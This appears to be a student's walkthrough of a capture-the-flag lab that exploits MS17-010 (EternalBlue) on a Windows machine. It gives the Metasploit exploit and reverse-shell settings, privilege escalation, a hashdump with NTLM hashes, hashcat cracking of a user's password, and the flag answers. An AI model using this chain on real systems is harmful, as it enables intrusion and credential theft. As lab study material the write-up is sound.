export IP=10.10.14.213


==================================================

[TASK 1] - Recon

1) Scan the machine.

	Command: `nmap -sV -oN nmap/initial $IP`

2) How many ports are open with a port number under 1000?
	
	Answer: `3` (135, 139, 445)

3) What is this machine vulnerable to?

	Command: `nmap --script vuln -oN nmap/vulnerabilities $IP`
	Answer: `ms17-010`


==================================================

[TASK 2] - Gain Access

1) Start Metasploit

	Command: `msfdb init` + `msfconsole`

2) Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

	Command: `search ms17_010`
	Answer: `exploit/windows/smb/ms17_010_eternalblue`

3) Show options and set the one required value. What is the name of this value? (All caps for submission)

	Command: `show options`
	Answer: `RHOSTS`

4) Run the exploit!

	Command: `exploit`

5) Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

	Notes: Had to try a few times. Here are my options:
		RHOSTS => 10.10.103.179
		RPORT => 445
		LHOST => 10.6.8.203
		LPORT => 4444


==================================================

[TASK 3] - Escalate

1) If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

	Notes: My session is already a meterpreter, but I googled "shell_to_meterpreter" anyway and found the answer.
	Answer: `post/multi/manage/shell_to_meterpreter`

2) Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
	
	Command: `use post/multi/manage/shell_to_meterpreter` + `show options`
	Answer: `SESSION`

3) Set the required option, you may need to list all of the sessions to find your target here.

	Command: `set SESSION 1`

4) Run! If this doesn't work, try completing the exploit from the previous task once more.

5) Once the meterpreter shell conversion completes, select that session for use.

6) Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

	Command: `getsystem`

7) List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

	Notes: There are a few processes towards the bottom running at NT AUTHORITY\SYSTEM, but based on my experience with the Metasploit room, I am choosing the spoolsv.exe process.
	Answer: Process ID `2592`

8) Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

	Command: `migrate 2592`
	Notes: Got response: Process already running at PID 2592


==================================================

[TASK 4] - Cracking

1) Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

	Command: 
		> `hashdump`
		Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
		Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
		Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
	Answer: `Jon`

2) Copy this password hash to a file and research how to crack it. What is the cracked password?

	Notes: 
		Copy and pasted the Jon... hash into the file, task4.question2.hash.txt.
		Used this link, https://www.tunnelsup.com/hash-analyzer/, to search what hashcat method to use. Found that the hash is NTLM, so -m 1000.
	Command: 
		> `hashcat -a 0 -m 1000 -o cracked-hash.txt task4.question2.hash.txt /usr/share/wordlists/rockyou.txt`
		ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
	Answer: `alqfna22`
		

==================================================

[TASK 5] - Find flags!

1) Flag1? (Only submit the flag contents {CONTENTS})

	Notes: Found in /.
	Answer: `access_the_machine`

2) Flag2? *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

	Notes: Windows stores important information such as passwords in this file location, /Windows/System32/Config/
	Answer: `sam_database_elevated_access`

3) flag3?
	
	Notes: Found in /Users/Jon/Documents.
	Answer: `admin_documents_can_be_valuable`